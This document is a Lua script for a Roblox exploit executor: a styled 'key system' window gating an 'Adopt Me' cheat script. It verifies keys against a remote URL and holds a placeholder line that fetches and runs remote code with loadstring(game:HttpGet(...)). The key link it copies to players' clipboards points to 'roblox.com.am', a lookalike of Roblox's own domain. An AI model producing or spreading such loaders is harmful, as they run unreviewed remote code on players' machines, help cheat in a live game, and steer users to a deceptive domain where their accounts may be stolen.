--// Adopt Me | Key System GUI

-- ====== SETTINGS (change these any time) ======
local KEY_LINK     = "https://www.roblox.com.am/communities/287321777111/scriptkeys"        -- link copied by the "Copy link" button
local VERIFY_URL   = "PASTE_YOUR_API_VERIFY_URL_HERE"  -- API URL that checks the key (the key gets added at the end)
local SCRIPT_TITLE = "Adopt Me"
-- ==============================================

local Players          = game:GetService("Players")
local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui          = game:GetService("CoreGui")

-- Remove an old GUI if the script is executed twice
pcall(function()
    local old = CoreGui:FindFirstChild("AdoptMeKeyGUI")
    if old then old:Destroy() end
end)

local gui = Instance.new("ScreenGui")
gui.Name = "AdoptMeKeyGUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
local ok = pcall(function() gui.Parent = CoreGui end)
if not ok then gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui") end

-- Colors
local BG      = Color3.fromRGB(22, 22, 30)
local PANEL   = Color3.fromRGB(32, 32, 44)
local ACCENT  = Color3.fromRGB(120, 90, 255)
local GREEN   = Color3.fromRGB(70, 200, 120)
local RED     = Color3.fromRGB(230, 70, 80)
local TEXT    = Color3.fromRGB(240, 240, 250)
local SUBTEXT = Color3.fromRGB(150, 150, 170)

local function corner(obj, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 8)
    c.Parent = obj
end

-- Main frame
local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, 380, 0, 230)
main.Position = UDim2.new(0.5, -190, 0.5, -115)
main.BackgroundColor3 = BG
main.BorderSizePixel = 0
main.Parent = gui
corner(main, 12)

local stroke = Instance.new("UIStroke")
stroke.Color = ACCENT
stroke.Thickness = 1.5
stroke.Transparency = 0.4
stroke.Parent = main

-- Title bar
local top = Instance.new("Frame")
top.Size = UDim2.new(1, 0, 0, 44)
top.BackgroundColor3 = PANEL
top.BorderSizePixel = 0
top.Parent = main
corner(top, 12)

local topFix = Instance.new("Frame") -- squares off the bottom corners of the title bar
topFix.Size = UDim2.new(1, 0, 0, 12)
topFix.Position = UDim2.new(0, 0, 1, -12)
topFix.BackgroundColor3 = PANEL
topFix.BorderSizePixel = 0
topFix.Parent = top

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -50, 1, 0)
title.Position = UDim2.new(0, 16, 0, 0)
title.BackgroundTransparency = 1
title.Text = SCRIPT_TITLE .. "  |  Key System"
title.TextColor3 = TEXT
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = top

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 28, 0, 28)
close.Position = UDim2.new(1, -38, 0, 8)
close.BackgroundColor3 = RED
close.Text = "X"
close.TextColor3 = TEXT
close.Font = Enum.Font.GothamBold
close.TextSize = 14
close.AutoButtonColor = true
close.Parent = top
corner(close, 6)
close.MouseButton1Click:Connect(function() gui:Destroy() end)

-- Subtitle
local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, -40, 0, 20)
sub.Position = UDim2.new(0, 20, 0, 56)
sub.BackgroundTransparency = 1
sub.Text = "Enter your key to continue"
sub.TextColor3 = SUBTEXT
sub.Font = Enum.Font.Gotham
sub.TextSize = 13
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.Parent = main

-- Key input
local box = Instance.new("TextBox")
box.Size = UDim2.new(1, -40, 0, 42)
box.Position = UDim2.new(0, 20, 0, 82)
box.BackgroundColor3 = PANEL
box.PlaceholderText = "Paste your key here..."
box.PlaceholderColor3 = SUBTEXT
box.Text = ""
box.TextColor3 = TEXT
box.Font = Enum.Font.Gotham
box.TextSize = 14
box.ClearTextOnFocus = false
box.Parent = main
corner(box, 8)

local boxStroke = Instance.new("UIStroke")
boxStroke.Color = ACCENT
boxStroke.Transparency = 0.7
boxStroke.Parent = box

-- Status label
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -40, 0, 20)
status.Position = UDim2.new(0, 20, 0, 130)
status.BackgroundTransparency = 1
status.Text = ""
status.TextColor3 = SUBTEXT
status.Font = Enum.Font.GothamMedium
status.TextSize = 13
status.TextXAlignment = Enum.TextXAlignment.Left
status.Parent = main

local function setStatus(msg, color)
    status.Text = msg
    status.TextColor3 = color or SUBTEXT
end

-- Buttons (left: Check Key | right: Copy link)
local function makeButton(text, xScale, xOffset, color)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0.5, -25, 0, 42)
    b.Position = UDim2.new(xScale, xOffset, 0, 165)
    b.BackgroundColor3 = color
    b.Text = text
    b.TextColor3 = TEXT
    b.Font = Enum.Font.GothamBold
    b.TextSize = 15
    b.AutoButtonColor = false
    b.Parent = main
    corner(b, 8)

    local base = color
    b.MouseEnter:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = base:Lerp(Color3.new(1, 1, 1), 0.15)}):Play()
    end)
    b.MouseLeave:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
    end)
    return b
end

local checkBtn = makeButton("Check Key", 0, 20, ACCENT)
local copyBtn  = makeButton("Copy link", 0.5, 5, PANEL)

-- Copy link
copyBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(KEY_LINK)
        setStatus("Link copied to clipboard!", GREEN)
    else
        setStatus("Your executor doesn't support setclipboard.", RED)
    end
end)

-- Check key
local checking = false
checkBtn.MouseButton1Click:Connect(function()
    if checking then return end
    local key = box.Text:gsub("%s+", "")
    if key == "" then
        setStatus("Please enter a key first.", RED)
        return
    end

    checking = true
    setStatus("Checking key...", SUBTEXT)

    local success, result = pcall(function()
        return game:HttpGet(VERIFY_URL .. key)
    end)

    if success and result and result:lower():find("true") then
        setStatus("Key valid! Loading...", GREEN)
        task.wait(1)
        gui:Destroy()

        -- ===== PUT YOUR MAIN SCRIPT HERE =====
        print("Key accepted, script loaded!")
        -- loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()
        -- =====================================
    else
        setStatus("Invalid key. Get a new one with 'Copy link'.", RED)
    end

    checking = false
end)

-- Draggable window
local dragging, dragStart, startPos
top.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local d = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
